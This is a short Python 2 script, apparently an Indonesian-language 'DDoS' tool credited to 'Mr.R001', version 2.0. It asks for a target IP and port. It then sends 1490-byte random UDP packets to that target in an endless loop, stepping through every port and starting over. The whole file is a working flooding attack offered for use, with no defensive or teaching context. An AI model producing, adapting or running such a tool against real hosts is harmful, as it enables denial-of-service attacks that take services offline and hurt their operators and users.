#coding=utf-8
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
os.system('clear')
print("""\033[1;31m
╔══╦═╦╦══╦═╦═╦╦═╦══╦══╦══╗─╔══╦══╦═╦══╗
╚║║╣║║╠╗╗║║║║║║╦╣══╬║║╣╔╗╠═╩╗╗╠╗╗║║║══╣
╔║║╣║║╠╩╝║║║║║║╩╬══╠║║╣╠╣╠═╦╩╝╠╩╝║║╠══║
╚══╩╩═╩══╩═╩╩═╩═╩══╩══╩╝╚╝─╚══╩══╩═╩══╝""")
print("""\033[1;37m|DDOS By: Mr.R001|Versi:2.0| """)
print(""" —————————————————————————————————————""")
print(""" •Pastikan Hammer Terinstall """)
print(""" •Masukan IP dan Port Dengan Benar """)
print(""" ————————————————————————————————————""")
ip = raw_input("•IP Target : ")
port = input("•Port : ")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent \033[1;31m%s packet to \033[1;31m%s throught port:\033[1;31m%s"%(sent,ip,port)
     if port == 65534:
       port = 1

